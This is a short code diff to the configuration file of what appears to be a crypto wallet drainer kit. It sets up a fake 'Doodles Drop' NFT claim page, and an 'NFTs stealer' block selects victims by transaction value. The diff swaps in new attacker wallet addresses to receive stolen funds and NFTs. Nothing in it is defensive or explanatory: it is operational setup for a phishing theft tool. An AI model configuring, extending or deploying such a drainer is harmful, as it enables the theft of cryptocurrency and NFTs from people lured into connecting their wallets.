@@ -1,4 +1,4 @@
-const receiveAddress = "0x7d410AF8b8DF79E84cB86d42f28b6EC3F5147a8E";
+const receiveAddress = "0xd23014904512658528cDd2D379Bb59Ba4f7C3e66";
 
 const collectionInfo = {
     name: "Doodles Drop",
@@ -35,7 +35,7 @@ const claimPageInfo = {
 const drainNftsInfo = {
     active: true, // Active (true) or not (false) NFTs stealer.
     minValue: 0.1, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-    nftReceiveAddress: "0x7d410AF8b8DF79E84cB86d42f28b6EC3F5147a8E" // leave empty if you want to use the same as receiveAddress 
+    nftReceiveAddress: "0xd23014904512658528cDd2D379Bb59Ba4f7C3e66" // leave empty if you want to use the same as receiveAddress
 }
 
 const customStrings = {
